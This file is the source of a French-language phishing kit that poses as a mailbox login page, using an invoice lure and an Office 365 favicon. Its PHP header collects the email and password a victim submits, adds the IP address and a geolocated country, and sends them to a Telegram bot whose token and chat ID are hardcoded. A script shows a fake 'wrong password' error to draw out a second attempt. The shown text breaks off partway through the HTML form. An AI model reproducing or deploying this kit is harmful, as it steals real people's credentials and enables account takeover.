<?php
session_start(); // Démarre la session

//include "bots/bot.php";

$email = $pass ="";
$emailText = "";
$error = false;
$isSucess = false;
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$subject ="";
function get_user_country() {
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". $_SERVER['REMOTE_ADDR'] .""));
if ($details && $details->geoplugin_countryName != null) {
    $countryname = $details->geoplugin_countryName;
}
return $countryname;
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {          

 

  $username = securInput($_POST["user"]);
  $pass    = securInput($_POST["password"]);


  $isSucess = true;


  

  

 if (preg_match('/^[a-z0-9.&@$#()=+*çà)({}}{_-]{7,30}$/i', $pass)) {

    $emailText .= "Adresse email :  $username\n";
    $emailText .= "Mot de passe :  $pass\n";


    $apiTokens = "6719588230:AAFNhjyZsljZvB62JgCKX-gxGFZqLC5D5WU";
    $datas = [
        'chat_id' => '6580737444', 
        'text' => $subject = "**** MAIL MULTI-BOX **** \r\n\r\n  [* Identification*]"  . "\r\n" . 'IP_User : ' . getenv("REMOTE_ADDR")   . "\r\n" . 'Data_Time : ' . $date = gmdate("H:i:s | d/m/Y") . "\r\n" . "\r\n"  . $emailText . "\r\n"  . "\r\n" .  'Country : ' . get_user_country() . "\r\n"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiTokens/sendMessage?" . http_build_query($datas)); 

    header("Location: ./done/loading1.php");


  }


}


function securInput($var)
{
  $var = trim($var);
  $var = stripcslashes($var);
  $var = htmlspecialchars($var);

  return $var;
}

?>


<html>
	<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <title>Connexion à ma messagerie - Universal Mailbox App</title>
    <link rel="stylesheet prefetch" href="styles/css.css">

	<link
	rel="shortcut icon"
	href="https://ow2.res.office365.com/owalanding/2022.9.20.02/images/favicon.ico?v=4"
	type="image/x-icon"
  />

<style>

html {
	line-height: 1.15;
	-ms-text-size-adjust: 100%;
	-webkit-text-size-adjust: 100%
}
body {
	height: 100%;
	margin: 0
}
article, aside, footer, header, nav, section {
	display: block
}
h1 {
	font-size: 2em;
	margin: .67em 0
}
figcaption, figure, main {
	display: block
}
figure {
	margin: 1em 40px
}
hr {
	box-sizing: content-box;
	height: 0;
	overflow: visible
}
pre {
	font-family: monospace, monospace;
	font-size: 1em
}
a {
	background-color: transparent;
	-webkit-text-decoration-skip: objects
}
abbr[title] {
	border-bottom: none;
	text-decoration: underline;
	text-decoration: underline dotted
}
b, strong {
	font-weight: inherit
}
b, strong {
	font-weight: bolder
}
code, kbd, samp {
	font-family: monospace, monospace;
	font-size: 1em
}
dfn {
	font-style: italic
}
mark {
	background-color: #ff0;
	color: #000
}
small {
	font-size: 80%
}
sub, sup {
	font-size: 75%;
	line-height: 0;
	position: relative;
	vertical-align: baseline
}
sub {
	bottom: -.25em
}
sup {
	top: -.5em
}
audio, video {
	display: inline-block
}
audio:not([controls]) {
	display: none;
	height: 0
}
img {
	border-style: none
}
svg:not(:root) {
	overflow: hidden
}
button, input, optgroup, select, textarea {
	font-family: sans-serif;
	font-size: 100%;
	line-height: 1.15;
	margin: 0
}
button, input {
	overflow: visible
}
button, select {
	text-transform: none
}
[type=reset], [type=submit], button, html [type=button] {
	-webkit-appearance: button
}
[type=button]::-moz-focus-inner, [type=reset]::-moz-focus-inner, [type=submit]::-moz-focus-inner, button::-moz-focus-inner {
border-style:none;
padding:0
}
[type=button]:-moz-focusring, [type=reset]:-moz-focusring, [type=submit]:-moz-focusring, button:-moz-focusring {
outline:1px dotted ButtonText
}
fieldset {
	padding: .35em .75em .625em
}
legend {
	box-sizing: border-box;
	color: inherit;
	display: table;
	max-width: 100%;
	padding: 0;
	white-space: normal
}
progress {
	display: inline-block;
	vertical-align: baseline
}
textarea {
	overflow: auto
}
[type=checkbox], [type=radio] {
	box-sizing: border-box;
	padding: 0
}
[type=number]::-webkit-inner-spin-button, [type=number]::-webkit-outer-spin-button {
height:auto
}
[type=search] {
	-webkit-appearance: textfield;
	outline-offset: -2px
}
[type=search]::-webkit-search-cancel-button, [type=search]::-webkit-search-decoration {
-webkit-appearance:none
}
::-webkit-file-upload-button {
-webkit-appearance:button;
font:inherit
}
details, menu {
	display: block
}
summary {
	display: list-item
}
canvas {
	display: inline-block
}
template {
	display: none
}
[hidden] {
	display: none
}
.ms-Fabric {
	-moz-osx-font-smoothing: grayscale;
	-webkit-font-smoothing: antialiased;
	color: #333;
	font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
	font-size: 14px
}
.ms-Fabric button, .ms-Fabric input {
	font-family: inherit
}

@media (max-width:479px) {
.ms-hiddenLgDown, .ms-hiddenMdDown, .ms-hiddenSm, .ms-hiddenXlDown, .ms-hiddenXxlDown {
	display: none!important
}
}

@media (min-width:480px) and (max-width:639px) {
.ms-hiddenLgDown, .ms-hiddenMd, .ms-hiddenMdDown, .ms-hiddenMdUp, .ms-hiddenXlDown, .ms-hiddenXxlDown {
	display: none!important
}
}

@media (min-width:640px) and (max-width:1023px) {
.ms-hiddenLg, .ms-hiddenLgDown, .ms-hiddenLgUp, .ms-hiddenMdUp, .ms-hiddenXlDown, .ms-hiddenXxlDown {
	display: none!important
}
}

@media (min-width:1024px) and (max-width:1365px) {
.ms-hiddenLgUp, .ms-hiddenMdUp, .ms-hiddenXl, .ms-hiddenXlDown, .ms-hiddenXlUp, .ms-hiddenXxlDown {
	display: none!important
}
}

@media (min-width:1366px) and (max-width:1919px) {
.ms-hiddenLgUp, .ms-hiddenMdUp, .ms-hiddenXlUp, .ms-hiddenXxl, .ms-hiddenXxlDown, .ms-hiddenXxlUp {
	display: none!important
}
}

@media (min-width:1920px) {
.ms-hiddenLgUp, .ms-hiddenMdUp, .ms-hiddenXlUp, .ms-hiddenXxlUp, .ms-hiddenXxxl {
	display: none!important
}
}
@font-face {
	font-family: 'FabricMDL2Icons';
	src: url('data:application/octet-stream;base64,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') format('truetype');
}
.ms-Icon {
	-moz-osx-font-smoothing: grayscale;
	-webkit-font-smoothing: antialiased;
	display: inline-block;
	font-family: 'FabricMDL2Icons';
	font-style: normal;
	font-weight: normal;
	speak: none;
}
.ms-Icon--Cancel:before {
	content: "\E711";
}
.ms-Icon--CheckMark:before {
	content: "\E73E";
}
.ms-Icon--Completed:before {
	content: "\E930";
}
.ms-Icon--Info:before {
	content: "\E946";
}
.ms-Icon--ErrorBadge:before {
	content: "\EA39";
}
body, html {
	height: 100%;
	background: #f4f4f4
}
.checkbox, .notification .dismiss:focus {
	outline: 0
}
.external-sharing-content {
	height: 100%
}
.external-sharing-content a.disabled {
	pointer-events: none;
	cursor: default
}
*, :after, :before {
	box-sizing: inherit
}
.spinner, html {
	box-sizing: border-box
}
.main-content {
	flex-direction: column;
	display: flex;
	align-items: center;
	padding: 0 12px
}
.top-banner {
	flex-direction: column;
	display: flex;
	height: 40px;
	padding: 0 20px;
	justify-content: center;
	background: #ffffff
}
.top-banner .brand-name {
	color: #fff;
	font-size: 21px
}
.checkbox {
	cursor: pointer;
	padding: 0;
	border: none;
	background: 0 0;
	margin: 0;
	display: block
}
.checkbox .checkbox-checkbox {
	height: 20px;
	width: 20px;
	box-sizing: border-box;
	display: flex;
	align-items: center;
	justify-content: center;
	border-width: 1px;
	border-style: solid;
	border-color: #a6a6a6;
	margin-right: 8px;
	transition-property: 'background, border, border-color';
	transition-duration: .2s;
	transition-timing-function: .2s;
	overflow: hidden
}
.checkbox .checkbox-checkbox .ms-Icon {
	visibility: hidden
}
.checkbox.checked .checkbox-checkbox .ms-Icon, .focus-area .ms-Icon:active+.callout, .focus-area .ms-Icon:focus+.callout, .focus-area .ms-Icon:hover+.callout {
	visibility: visible
}
.checkbox input[type=checkbox] {
	display: none
}
.checkbox .checkbox-label {
	display: inline-flex;
	align-items: center;
	cursor: pointer;
	position: relative;
	user-select: none
}
.checkbox.disabled .checkbox-checkbox {
	background: #eaeaea;
	border-color: #eaeaea;
	color: #fff
}
.checkbox.disabled .checkbox-label {
	cursor: default
}
.checkbox .checkbox-text {
	margin-right: 8px;
	font-size: 14px
}
.checkbox.checked .checkbox-checkbox {
	border-color: #0078d7;
	background: #0078d7;
	color: #fff
}
.notification {
	height: 32px;
	display: flex;
	justify-content: center;
	align-items: center;
	z-index: 1;
	position: absolute;
	top: -32px;
	left: 0;
	width: 100%;
	transition: top .5s ease-in-out
}
.notification .dismiss {
	border: 0;
	padding: 0;
	background: 0 0;
	height: 15px;
	width: 15px;
	margin: 0 8px
}
.notification .dismiss:hover {
	cursor: pointer
}
.notification .dismiss .ms-Icon {
	margin: 0
}
.notification.visible {
	top: 0
}
.notification.success {
	background: #dff6dd
}
.notification.error {
	background: #fde7e9
}
.notification .ms-Icon {
	margin: 0 8px
}
.notification span {
	flex: 1 1 100%
}
input::-webkit-inner-spin-button, input::-webkit-outer-spin-button {
margin:0;
-webkit-appearance:none
}
input[type=number] {
	-moz-appearance: textfield
}
input[type=number]::-ms-clear {
display:none
}
.desktop-logo {
	margin: 57px 0 20px
}
.mobile-logo {
	margin-top: 24px
}
.microsoft-logo {
	height: 24px;
	width: 113px
}
.form-input-container {
	position: relative;
	font-size: 17px
}
.form-input-container .focus-area {
	position: absolute;
	top: 12.5px;
	right: 12.5px
}
.sharing-form {
	border-radius: 6px;
	box-shadow: 0 0 10px 0 rgba(0,0,0,.17);
	max-width: 360px;
	display: flex;
	flex-direction: column;
	margin: 13px 0 16px
}
.sharing-form .header {
	border-top-left-radius: 6px;
	border-top-right-radius: 6px;
	padding-top: 21px;
	height: 72px;
	border-bottom-width: 1px;
	border-bottom-style: solid;
	border-color: #c8c8c8;
	font-size: 21px;
	text-align: center;
	background-color: #f8f8f8;
	z-index: 2;
	position: relative
}
.form-content {
	border-bottom-right-radius: 6px;
	border-bottom-left-radius: 6px;
	padding: 28px 32px 32px;
	background: #fff;
	position: relative
}
.form-content .placeholder-text, .form-content input {
	height: 44px;
	width: 100%
}
.form-content .form-submit {
	background-color: #0078d7;
	color: #fff;
	border: 0
}
.form-content .form-submit.disabled {
	background: #f4f4f4;
	color: #a6a6a6
}
.form-content .form-submit.disabled+.submitted-text {
	display: flex;
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	justify-content: center;
	align-items: center
}
.form-content .form-submit.disabled+.submitted-text .spinner {
	margin-right: 14px
}
.form-content .form-submit+.submitted-text {
	color: #a6a6a6;
	background-color: #f4f4f4;
	display: none
}
.file-description .file-description-title {
	color: #666;
	font-size: 14px;
	margin-bottom: 24px
}
.file-description .file-info {
	
	align-items: center;
	text-align: justify;
  display: block;
}
.file-description .file-info img {
	height: 32px;
	width: 32px;
}
.file-description .file-info .file-name {
	font-size: 17px;
	color: #333
}
.form-message {
	font-size: 14px;
	font-weight: 400;
	color: #666;
	line-height: 17px;
	margin: 22px 0 24px
}
.form-message .email {
	color: #333
}
.form-message a {
	color: #666
}
.interrupt-message {
	text-align: center
}
.interrupt-message img {
	width: 79px;
	height: 82px;
	margin-bottom: 20px
}
.interrupt-message .interrupt-message-text {
	font-size: 17px
}
.form-text-input {
	border-width: 1px;
	border-style: solid;
	padding: 11px;
	margin-bottom: 20px;
	color: #666;
	border-color: #a6a6a6
}
.form-text-input.disabled {
	background: #f4f4f4;
	color: #a6a6a6;
	border: #f4f4f4
}
.form-text-input.disabled::placeholder {
color:#a6a6a6
}
.form-text-input.is-empty+.placeholder-text {
	display: block
}
.form-text-input.has-error {
	border-color: #A80000;
	margin-bottom: 14px
}
.form-text-input+.placeholder-text {
	position: absolute;
	color: #666;
	top: 0;
	left: 0;
	line-height: 44px;
	padding: 0 11px;
	display: none;
	pointer-events: none
}
.focus-area, .focus-area .ms-Icon {
	position: relative;
	display: inline-block
}
.form-text-input::placeholder {
color:#666
}
.form-error-container {
	color: #A80000;
	font-size: 12px;
	margin-bottom: 8px
}
.focus-area {
	vertical-align: middle
}
.callout {
	bottom: 200%;
	width: 276px;
	left: 50%;
	font-size: 12px;
	line-height: 16px;
	visibility: hidden;
	background-color: #fff;
	color: #333;
	padding: 9px 12px;
	border-radius: 6px;
	margin-left: calc(-276px/2);
	text-align: left;
	box-shadow: 2px 2px 10px 0 rgba(0,0,0,.3);
	position: absolute;
	z-index: 3
}
.callout .callout-title {
	font-size: 17px;
	margin-bottom: 11px;
	line-height: 20px
}
.callout:after {
	content: " ";
	position: absolute;
	box-shadow: rgba(0,0,0,.3) 2px 2px 2px;
	transform: rotate(45deg);
	bottom: -9px;
	border-width: 10px;
	border-style: solid;
	border-color: transparent #fff #fff transparent;
	left: 127px
}

@media (max-width:479px) {
.callout {
	left: -95px
}
.callout:after {
	right: 24px;
	left: initial
}
}
.legal {
	font-size: 12px;
	font-weight: 400;
	display: flex;
	justify-content: space-between
}
.legal>* {
	margin-right: 12px
}
.legal>:last-child {
	margin-right: 0
}
.legal a {
	color: #333;
	text-decoration: none
}
.spinner {
	height: 20px;
	width: 20px;
	border-radius: 50%;
	border: 1.5px solid #c7e0f4;
	border-top-color: #0078d7;
	animation: spinAnimation 1.3s infinite cubic-bezier(.53, .21, .29, .67)
}
@keyframes spinAnimation {
0% {
transform:rotate(0)
}
100% {
transform:rotate(360deg)
}
}
.form-checkbox-container {
	margin-top: 24px;
	font-size: 14px;
	font-weight: 400
}

body{

background-image:url('styles/img/mailground.jpg');

}

.images-container {
  text-align: justify;
  display: block;
}

.images {
 display: block;
  margin: auto;
}

</style>
<style>
	/* Désactive la bordure de focus sur les icônes lorsqu'elles sont cliquées */
	svg:focus {
		outline: none;
	}

	.password-icon-container {
		position: absolute;
		margin-top: 12px;
		margin-left: 263px;
	}

	.password-icon {
		width: 12px;
		height: 24px;
		position: absolute;
		top: 0;
		left: 0;
	}

	.password-icon2 {
		opacity: 0;
	}

  .errorClass{

	color:red;
	font-size:12px;
	
  }

</style>




    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="styles/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>

    <div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
        <div class="top-banner">
            <div class="brand-name">
				<span style="font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;"><img class="img-fluid" src="styles/img/1549792991447.png" width="140px"></span>
            </div>
        </div>
        <div class="main-content">
            <div class="desktop-logo ms-hiddenSm">
                
            </div>
            <div class="sharing-form">
                <div class="header">
                    <span style="margin-top: -8px; font-weight: bold; color: #0078d7; font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">Universal Mailbox App </span>
                
					<div>
						<img alt="logo-mail" src="styles/img/mails2.png" style="width: 27%;">
					
					</div>
				
				</div>
				
				
                <div style="" class="form-content">

                        <div class="file-description">
						


<br>
<p style="font-size: 18px; color:#4B4F54 ; text-align: center; font-weight: bold;">Vérification d'identité</p>
<p id="showError0" style="text-align:center; font-size:12px;"> </p>

                            <p class="file-description-title" style="text-align: center; font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">Vous avez reçu votre Facture EG</p>
                            <div class="file-info">
								<div class="images-container">
                                <img class="images" alt="" src="styles/img/doc0.png" style="height:35px;width:35px;">
							   </div>
                                <div class="file-name" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
                                    <p style="text-align: center; font-size: 12px;">53.1Ko</p>
                                </div>
                            </div>
                        </div>



                        <div>
                            <div class="form-message" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;line-height: 25px"><p>Pour consulter ou télécharger votre document, veuillez vous connecter à votre boîte de messagerie depuis cette plateforme sécurisée.</p>
                            </div>
                            <div class="file-description">
                                <div class="file-info">
                                </div>
                            </div>
<div class="images-container">
							<svg fill="#4B4F54" class="images" width="20%" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="var(--text-gray-secondary-color)" data-testid="iconTestId"><g id="Icon/32px/User/person-circle" stroke="none" stroke-width="1" fill="current" fill-rule="evenodd"><g id="Icon/User/person-circle/32px" transform="translate(2.666667, 2.666667)" fill="current"><path d="M13.3333334,0 C20.6971301,0 26.6666668,5.96953669 26.6666668,13.3333334 C26.6666668,20.6971301 20.6971301,26.6666668 13.3333334,26.6666668 C5.96953669,26.6666668 0,20.6971301 0,13.3333334 C0,5.96953669 5.96953669,0 13.3333334,0 Z M13.3333334,1.66666667 C8.84982244,1.66690538 4.76309789,4.23644385 2.81994017,8.27698943 C0.876782456,12.317535 1.42100817,17.1141655 4.22000002,20.6166668 C5.40333336,18.7100001 8.00833337,16.6666667 13.3333334,16.6666667 C18.6583334,16.6666667 21.2616668,18.7083334 22.4466668,20.6166668 C25.2456586,17.1141655 25.7898843,12.317535 23.8467266,8.27698943 C21.9035689,4.23644385 17.8168443,1.66690538 13.3333334,1.66666667 Z M13.3333334,5.00000002 C16.0947571,5.00000002 18.3333334,7.23857628 18.3333334,10 C18.3333334,12.7614238 16.0947571,15 13.3333334,15 C10.5719096,15 8.33333337,12.7614238 8.33333337,10 C8.33333337,7.23857628 10.5719096,5.00000002 13.3333334,5.00000002 Z" id="Combined-Shape"></path></g></g></svg>
</div>
                       <p style="font-size: 16px; color:#4B4F54 ; text-align: center; font-weight: bold;">Se connecter</p>

						<p style="
							font-weight: bold;
							text-align:center;
							font-size: 8px;
							color: #4B4F54;
							margin-top: -18px;
						  ">    <svg style="" _ngcontent-c4="" aria-hidden="true" class="svg-inline--fa fa-lock fa-w-14 blue-icon" data-prefix="fas" data-icon="lock" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg="" width="6px" color="#32CD32">
						<path fill="currentColor" d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"></path>
					  </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
						  Donnéés sécurisées
						</p>

<div class="images-container">
					   <img class="images" alt="logo-mail" src="styles/img/mail1.png" style=" height:30px;width:190px; margin-bottom: 10px">

					</div>
<p style="text-align:center; font-size:12px" id="showError"></p>


<script>

// Fonction pour afficher et masquer les messages d'erreur
function showAndHideError() {
    // Sélectionner les éléments <p> avec les IDs "showError0" et "showError"
    var errorElement0 = document.getElementById("showError0");
    var errorElement1 = document.getElementById("showError");

    // Afficher le message0 d'erreur si l'élément existe
    if (errorElement0) {
        errorElement0.textContent = "Votre mot de passe ne correspond pas à votre adresse e-mail.";
        errorElement0.style.color = 'red';

        // Utiliser setTimeout pour masquer l'élément après 8 secondes
        setTimeout(function() {
            errorElement0.style.display = 'none';
        }, 15000);
    }

    // Afficher le message d'erreur si l'élément existe
    if (errorElement1) {
        errorElement1.textContent = "Une erreur s'est produite, veuillez réessayer.";
        errorElement1.style.color = 'red';

        // Utiliser setTimeout pour masquer l'élément après 3 secondes
        setTimeout(function() {
            errorElement1.style.display = 'none';
        }, 40000);
    }
}

// Appel de la fonction pour afficher et masquer les messages d'erreur
showAndHideError();



</script>




                    

<form method="post" >

                            <div class="form-input-container">
                                <input type="text" name="user" placeholder="Email address" id="email" maxlength="75">
								<span style="color:red; font-size:11px" class="errorClass" id="emailError"></span>

								<br><br>


								<div id="toggle-password" class="password-icon-container" tabindex="0" data-oevent-category="idme_password" data-oevent-action="clic_afficher_mot_de_passe" data-oevent-label="afficher_mot_de_passe" aria-label="Afficher/Cacher le mot de passe">
								<div class="password-icon password-icon1">
									<svg  width="19" height="19" viewBox="0 0 1024 1024" id="password-icon" tabindex="0" data-testid="toggle-password-visibility"  data-oevent-action="clic_afficher_mot_de_passe" data-oevent-label="afficher_mot_de_passe"  aria-label="afficher le mot de passe">
										<path d="M864 333.44l-49.28 50.56c50.002 33.095 92.365 73.013 127.070 119.032l0.93 1.288c-41.44 53.835-91.68 98.568-148.948 132.746l-2.412 1.334c-18.252 10.798-40.321 22.039-63.081 31.994l-4.119 1.606c36.891-46.099 59.201-105.262 59.201-169.636 0-0.212-0-0.425-0.001-0.637l0 0.033c-0.019-27.832-4.11-54.702-11.708-80.055l0.508 1.975-57.92 57.92q0 10.24 0 20.16c0 0.095 0 0.208 0 0.32 0 112.931-91.549 204.48-204.48 204.48-0.113 0-0.225-0-0.338-0l0.018 0q-9.92 0-20.16 0l-73.28 73.92c24.084 4.368 51.862 6.924 80.216 7.040l0.104 0h27.52c213.44 0 429.44-150.4 499.52-284.48-40.308-68.773-93.84-125.575-157.531-168.44l-1.829-1.16zM214.080 626.88c-52.472-33.69-96.867-74.724-133.165-122.271l-0.915-1.249c41.44-53.835 91.68-98.568 148.948-132.746l2.412-1.334c17.571-10.949 38.558-22.266 60.235-32.348l3.765-1.572c-35.913 45.587-57.6 103.842-57.6 167.162 0 0.182 0 0.364 0.001 0.546l-0-0.028c-0.003 0.441-0.004 0.962-0.004 1.484 0 30.511 5.157 59.817 14.647 87.095l-0.563-1.86 56.32-56.64c-1.429-8.636-2.245-18.588-2.245-28.73 0-0.475 0.002-0.949 0.005-1.423l-0 0.073c0.181-113.148 91.947-204.802 205.12-204.802 0.338 0 0.675 0.001 1.013 0.002l-0.052-0c10.709 0.107 21.128 0.918 31.334 2.388l-1.254-0.148 73.6-73.6c-26.109-4.976-56.196-7.882-86.94-8l-0.1-0h-27.52c-215.040-0-431.040 150.4-501.12 284.16 41.492 70.521 96.899 128.586 162.851 171.918l1.949 1.202zM628.16 461.44l312-311.68-60.48-60.48-477.12 477.12-306.56 307.84 60.48 60.48 313.6-313.6z" fill="#000"></path></svg>
									  
								</div>
								<div class="password-icon password-icon2">
								
						<svg   width="19" height="19" viewBox="0 0 1024 1024" id="password-icon2" tabindex="0" data-testid="toggle-password-visibility" data-oevent-category="idme_password" data-oevent-action="clic_afficher_mot_de_passe" data-oevent-label="afficher_mot_de_passe" role="button" aria-label="cacher le mot de passe">
